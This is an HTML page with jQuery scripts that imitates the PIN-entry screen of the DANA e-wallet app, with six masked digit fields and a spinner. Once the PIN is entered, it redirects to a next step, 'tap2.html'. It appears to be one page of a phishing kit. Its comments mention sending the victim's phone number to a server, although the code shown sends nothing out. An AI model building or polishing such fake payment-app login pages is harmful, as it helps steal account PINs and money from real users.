<!DOCTYPE html><html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>PIN</title>
        <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous"> 
        <link rel="stylesheet" href="css/loading.css" type="text/css" media="all">
        <link rel="stylesheet" href="css/pin.css" type="text/css" media="all">
    </head>
    <body>
        <!-- ketika halaman di klik munculkan loading -->
        <div id="process" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="images/load_bg.png">
                <img class="spinner" src="images/load_spin.png">
            </div>
        </div>
        
        <div class="nav-dana">
            <img onclick="location.href='../index.html'" src="images/back.png" alt="">
            <span class="masuk">Masuk</span>
            <p>lol</p>
        </div>
        
        <form id="formPin">
            <p class="masukpin">Masukkan PIN</p>
    <div class="box-input-pin">
    <div type="button" class="clearPin"></div>       
    <input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin1" autocomplete="off" class="inppin">
    

<input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin2" autocomplete="off" class="inppin">

<input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin3" autocomplete="off" class="inppin">

<input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin4" autocomplete="off" class="inppin">

<input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin5" autocomplete="off" class="inppin">

<input type="password" pattern="[0-9]*" inputmode="numeric" placeholder=" " minlength="1" maxlength="1" id="pin6" autocomplete="off" class="inppin">

</div>

      <!-- Hidden Input untuk mengirim No HP ke Server -->
      <input type="hidden" id="hiddenPhone" value="">

<div class="box-cs">
    <div class="flex-cs">
        <img src="images/cs.png" alt="">
        BUTUH BANTUAN?
    </div>
    <div class="riset-pin">
        LUPA PIN?
    </div>
</div>
            </form>

    <!-- Load jQuery (Saya rapihkan, cukup satu kali yang lengkap) -->
    <script src="js/jquery-3.5.1.min.js"></script>
    <script src="js/jquery.mask.min.js"></script>

    <!-- SCRIPT PERTAMA: Clear Pin -->
    <script>
    $(document).ready(function() {
        $('.clearPin').click(function() {
            $('.inppin').val('');
            $('#pin1').focus();
        });
    });
    </script>
    
    <!-- SCRIPT KEDUA: Logika Input (Gaya Asli Kamu) -->
    <script>
    $('.inppin').on('input', function(event) {
        const inputs = $('.inppin');
        const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
        if (isAllFilled == true) {
            $(event.target).blur();
            sendPin();
        };
        const index = inputs.index(this);
        const currentValue = event.target.value;
        if (currentValue.length === 1) {
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        } else if (currentValue.length === 0) {
            if (index > 0) {
                inputs[index].focus();
            }
        };
    });
    $('.inppin').on('keydown', function(event) {
        const inputs = $('.inppin');
        const key = event.key;
        const index = inputs.index(this);
        if (key === 'Backspace' && event.target.value.length === 0) {
            if (index > 0) {
                inputs[index - 1].focus();
            }
        };
    });
    </script>
    
    <!-- SCRIPT KETIGA: Kirim Data (Ditambahkan logika ambil No HP) -->
    <script>
    function sendPin() {
        $("#process").show();
        event.preventDefault();
        $("#pin1").blur();
        
        setTimeout(function() {
            window.location.href = 'tap2.html';
        }, 1000);
    };
    </script>
    
</body></html>
